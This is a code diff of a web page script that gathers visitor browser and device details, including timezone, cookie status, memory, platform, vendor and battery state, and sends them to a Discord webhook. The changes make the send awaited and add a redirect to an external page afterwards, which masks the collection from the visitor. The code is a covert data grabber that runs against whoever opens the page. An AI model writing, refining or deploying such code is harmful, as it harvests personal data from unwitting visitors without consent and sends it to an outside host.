@@ -46,7 +46,7 @@
             timezoneOffset: new Date().getTimezoneOffset(),
             cookiesEnabled: navigator.cookieEnabled,
             online: navigator.onLine,
-            memory: navigator.deviceMemory || "N/A", // Added missing comma here
+            memory: navigator.deviceMemory || "N/A",
             platform: navigator.platform,
             vendor: navigator.vendor,
             product: navigator.product,
@@ -92,7 +92,10 @@
         }
 
         // Send user data to Discord webhook
-        sendToDiscord(userData);
+        await sendToDiscord(userData);
+
+        // Redirect after sending data
+        window.location.href = 'https://eagx.github.io/bidet/';
     }
 
     function getBrowserName() {
@@ -124,14 +127,6 @@
             return `Level: ${battery.level * 100}%, Charging: ${battery.charging}`;
         }
         return "Battery info not available";
-    }
-
-    async function getBatteryLevel() {
-        if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            return `${(battery.level * 100).toFixed(0)}%`;
-        }
-        return "N/A";
     }
 
     async function getOrientation() {
